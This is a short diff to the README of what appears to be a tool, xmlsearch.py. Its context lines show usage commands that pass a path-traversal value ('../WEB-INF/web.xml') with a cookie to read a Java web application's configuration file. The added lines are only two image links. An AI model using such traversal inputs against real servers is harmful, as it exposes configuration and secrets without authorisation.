@@ -14,3 +14,6 @@ python xmlsearch.py -u https://xxx.xxx/?file=../WEB-INF/web.xml -c="cookie"
 # if post
 python xmlsearch.py -u https://xxx.xxx/ -d="file=../WEB-INF/web.xml" -t="content-type(default application/x-www-form-urlencoded)" -c="cookie"
 ```
+![1](https://i.loli.net/2019/04/05/5ca728049a7fb.jpg)
+
+![2](https://i.loli.net/2019/04/05/5ca7283ee522d.jpg)
